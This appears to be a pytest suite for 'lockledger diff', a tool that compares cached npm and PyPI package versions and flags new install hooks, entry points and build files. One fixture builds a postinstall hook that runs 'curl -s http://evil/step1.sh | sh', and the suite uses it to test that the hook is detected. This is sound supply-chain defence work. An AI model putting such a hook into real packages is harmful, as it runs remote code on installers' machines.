"""`lockledger diff` over hand-built artifacts, with install-script detection."""

import json

from conftest import npm_tarball, pypi_sdist, pypi_wheel, run_cli, write_npm_lock

from lockledger import fetch as fetch_module
from lockledger.difftool import load_artifact


def stage(cache_dir, path, ecosystem, name, version):
    """Place a hand-built artifact where `cache` would have written it."""
    directory = cache_dir / ecosystem / name.replace("/", "__") / version
    directory.mkdir(parents=True, exist_ok=True)
    target = directory / path.name
    target.write_bytes(path.read_bytes())
    return target


def diff(db, cache_dir, name, version_a, version_b, *extra):
    return run_cli(
        "--db", str(db), "--cache-dir", str(cache_dir),
        "diff", name, version_a, version_b, *extra,
    )


def test_diff_reports_a_new_postinstall_hook(tmp_path, db, cache_dir, capsys):
    before = npm_tarball(
        tmp_path / "artifacts" / "widget-1.0.0.tgz", "widget", "1.0.0",
        scripts={"build": "tsc"},
        files={"README.md": "# widget\n", "index.js": "module.exports = 1;\n"},
    )
    after = npm_tarball(
        tmp_path / "artifacts" / "widget-1.0.1.tgz", "widget", "1.0.1",
        scripts={"build": "tsc", "postinstall": "node ./install.js"},
        files={
            "README.md": "# widget\n",
            "index.js": "module.exports = 2;\n",
            "install.js": "require('child_process').exec('curl -s http://evil/step1.sh | sh');\n",
            "vendor/blob.bin": "\x00\x01",
        },
    )
    stage(cache_dir, before, "npm", "widget", "1.0.0")
    stage(cache_dir, after, "npm", "widget", "1.0.1")

    assert diff(db, cache_dir, "widget", "1.0.0", "1.0.1", "--ecosystem", "npm") == 0
    out = capsys.readouterr().out
    assert "+ postinstall: node ./install.js" in out
    assert "NEW install script postinstall" in out
    assert "install.js" in out and "blob.bin" in out
    assert "changed" in out and "index.js" in out


def test_diff_json_structure(tmp_path, cache_dir, db, capsys):
    before = npm_tarball(tmp_path / "a.tgz", "widget", "1.0.0", files={"index.js": "1\n"})
    after = npm_tarball(
        tmp_path / "b.tgz", "widget", "1.1.0",
        scripts={"preinstall": "node ./bootstrap.js"},
        files={"index.js": "2\n", "bootstrap.js": "// payload\n"},
    )
    stage(cache_dir, before, "npm", "widget", "1.0.0")
    stage(cache_dir, after, "npm", "widget", "1.1.0")

    assert diff(db, cache_dir, "widget", "1.0.0", "1.1.0", "--ecosystem", "npm", "--json") == 0
    result = json.loads(capsys.readouterr().out)
    assert result["name"] == "widget" and result["ecosystem"] == "npm"
    assert result["files"]["added"] == ["bootstrap.js"]
    assert result["files"]["removed"] == []
    assert result["files"]["changed"] == ["index.js", "package.json"]
    assert result["files"]["file_delta"] == 1
    assert result["install_scripts"]["added"] == [
        {"hook": "preinstall", "command": "node ./bootstrap.js"}
    ]
    assert result["flags"] == ["NEW install script preinstall: node ./bootstrap.js"]


def test_diff_detects_changed_and_removed_hooks(tmp_path, db, cache_dir, capsys):
    before = npm_tarball(
        tmp_path / "a.tgz", "hooky", "1.0.0",
        scripts={"install": "node old.js", "postinstall": "node gone.js"},
    )
    after = npm_tarball(
        tmp_path / "b.tgz", "hooky", "1.0.1",
        scripts={"install": "node new.js"},
    )
    stage(cache_dir, before, "npm", "hooky", "1.0.0")
    stage(cache_dir, after, "npm", "hooky", "1.0.1")

    assert diff(db, cache_dir, "hooky", "1.0.0", "1.0.1", "--ecosystem", "npm", "--json") == 0
    result = json.loads(capsys.readouterr().out)
    assert [change["hook"] for change in result["install_scripts"]["changed"]] == ["install"]
    assert [change["hook"] for change in result["install_scripts"]["removed"]] == ["postinstall"]
    assert any("CHANGED install script install" in flag for flag in result["flags"])


def test_diff_of_identical_artifacts_is_quiet(tmp_path, db, cache_dir, capsys):
    artifact = npm_tarball(tmp_path / "same.tgz", "quiet", "1.0.0", scripts={"postinstall": "x"})
    stage(cache_dir, artifact, "npm", "quiet", "1.0.0")
    stage(cache_dir, artifact, "npm", "quiet", "1.0.1")

    assert diff(db, cache_dir, "quiet", "1.0.0", "1.0.1", "--ecosystem", "npm", "--json") == 0
    result = json.loads(capsys.readouterr().out)
    assert result["flags"] == []
    assert result["files"]["added"] == [] and result["files"]["changed"] == []


def test_diff_pypi_entry_points_and_setup_files(tmp_path, db, cache_dir, capsys):
    before = pypi_wheel(tmp_path / "pkg-1.0.0-py3-none-any.whl", "coldpkg", "1.0.0")
    after = pypi_wheel(
        tmp_path / "pkg-1.0.1-py3-none-any.whl", "coldpkg", "1.0.1",
        entry_points="[console_scripts]\ncoldpkg = coldpkg.evil:main\n",
        files={"coldpkg/evil.py": "def main():\n    pass\n"},
    )
    stage(cache_dir, before, "pypi", "coldpkg", "1.0.0")
    stage(cache_dir, after, "pypi", "coldpkg", "1.0.1")

    assert diff(db, cache_dir, "coldpkg", "1.0.0", "1.0.1", "--ecosystem", "pypi", "--json") == 0
    result = json.loads(capsys.readouterr().out)
    assert result["entry_points"]["changed"] is True
    assert "coldpkg = coldpkg.evil:main" in result["entry_points"]["after"]
    assert "changed entry_points" in result["flags"]
    assert "coldpkg/evil.py" in result["files"]["added"]
    assert any(name.endswith("entry_points.txt") for name in result["files"]["added"])


def test_diff_pypi_sdist_setup_py_appears(tmp_path, db, cache_dir, capsys):
    before = pypi_sdist(tmp_path / "warm-1.0.0.tar.gz", "warmpkg", "1.0.0")
    after = pypi_sdist(
        tmp_path / "warm-1.0.1.tar.gz", "warmpkg", "1.0.1",
        setup_cfg="[options.entry_points]\nconsole_scripts=\n    warmpkg = warmpkg:main\n",
    )
    stage(cache_dir, before, "pypi", "warmpkg", "1.0.0")
    stage(cache_dir, after, "pypi", "warmpkg", "1.0.1")

    assert diff(db, cache_dir, "warmpkg", "1.0.0", "1.0.1", "--ecosystem", "pypi", "--json") == 0
    result = json.loads(capsys.readouterr().out)
    assert result["build_files"]["removed"] == ["setup.py"]
    assert result["build_files"]["added"] == ["setup.cfg"]
    assert result["entry_points"]["changed"] is True
    assert "NEW build hook file setup.cfg" in result["flags"]


def test_diff_bounded_lists_still_report_full_counts(tmp_path, db, cache_dir, capsys):
    many = {f"src/module-{index:03d}.js": f"export const n = {index};\n" for index in range(25)}
    before = npm_tarball(tmp_path / "a.tgz", "big", "1.0.0")
    after = npm_tarball(tmp_path / "b.tgz", "big", "1.0.1", files=many)
    stage(cache_dir, before, "npm", "big", "1.0.0")
    stage(cache_dir, after, "npm", "big", "1.0.1")

    assert diff(db, cache_dir, "big", "1.0.0", "1.0.1", "--ecosystem", "npm") == 0
    out = capsys.readouterr().out
    assert "added (25)" in out
    assert "more" in out
    assert out.count("module-") == 20

    assert diff(db, cache_dir, "big", "1.0.0", "1.0.1", "--ecosystem", "npm", "--limit", "5") == 0
    bounded = capsys.readouterr().out
    assert "added (25):" in bounded
    assert bounded.count("module-") == 5
    assert "... 20 more" in bounded

    assert diff(db, cache_dir, "big", "1.0.0", "1.0.1", "--ecosystem", "npm", "--json") == 0
    result = json.loads(capsys.readouterr().out)
    assert result["files"]["added_count"] == 25
    assert len(result["files"]["added"]) == 25  # JSON keeps the complete list


def test_diff_missing_tarball_exits_two_with_the_exact_cache_command(tmp_path, db, cache_dir, capsys):
    before = npm_tarball(tmp_path / "a.tgz", "halfgone", "1.0.0")
    stage(cache_dir, before, "npm", "halfgone", "1.0.0")

    assert diff(db, cache_dir, "halfgone", "1.0.0", "1.0.1", "--ecosystem", "npm") == 2
    err = capsys.readouterr().err
    assert "halfgone@1.0.1 is not in the local cache" in err
    assert "lockledger cache halfgone@1.0.1 --ecosystem npm" in err


def test_diff_missing_both_mentions_only_the_first(tmp_path, db, cache_dir, capsys):
    assert diff(db, cache_dir, "absent", "1.0.0", "2.0.0", "--ecosystem", "npm") == 2
    assert "lockledger cache absent@1.0.0 --ecosystem npm" in capsys.readouterr().err


def test_diff_never_fetches(tmp_path, db, cache_dir, monkeypatch, capsys):
    def explode(*args, **kwargs):
        raise AssertionError("diff attempted a download")

    monkeypatch.setattr(fetch_module.urllib.request, "urlopen", explode)
    assert diff(db, cache_dir, "widget", "1.0.0", "1.0.1", "--ecosystem", "npm") == 2
    assert "not in the local cache" in capsys.readouterr().err


def test_diff_uses_the_ecosystem_recorded_in_the_store(locks, db, tmp_path, cache_dir, capsys):
    add = run_cli("--db", str(db), "add", str(write_npm_lock(locks, 1, [("widget", "1.0.0")])))
    assert add == 0
    before = npm_tarball(tmp_path / "a.tgz", "widget", "1.0.0")
    after = npm_tarball(tmp_path / "b.tgz", "widget", "1.0.1", scripts={"postinstall": "node x.js"})
    stage(cache_dir, before, "npm", "widget", "1.0.0")
    stage(cache_dir, after, "npm", "widget", "1.0.1")

    assert diff(db, cache_dir, "widget", "1.0.0", "1.0.1") == 0
    assert "NEW install script postinstall" in capsys.readouterr().out


def test_diff_without_ecosystem_information_exits_one(db, cache_dir, capsys):
    assert diff(db, cache_dir, "unknownpkg", "1.0.0", "1.0.1") == 1
    assert "--ecosystem" in capsys.readouterr().err


def test_load_artifact_handles_prefixless_zip(tmp_path, db, cache_dir):
    wheel = pypi_wheel(tmp_path / "flat-1.0.0-py3-none-any.whl", "flat", "1.0.0")
    artifact = load_artifact(wheel, "pypi")
    assert "flat-1.0.0/core.py" in artifact.names
    assert "flat-1.0.0.dist-info/METADATA" in artifact.names


def test_diff_rejects_a_corrupt_cached_artifact(db, cache_dir, capsys):
    broken = cache_dir / "npm" / "broken" / "1.0.0" / "broken-1.0.0.tgz"
    broken.parent.mkdir(parents=True)
    broken.write_text("not a tarball")
    other = cache_dir / "npm" / "broken" / "1.0.1" / "broken-1.0.1.tgz"
    other.parent.mkdir(parents=True)
    other.write_text("not a tarball either")

    assert diff(db, cache_dir, "broken", "1.0.0", "1.0.1", "--ecosystem", "npm") == 1
    assert "unreadable cached artifact" in capsys.readouterr().err
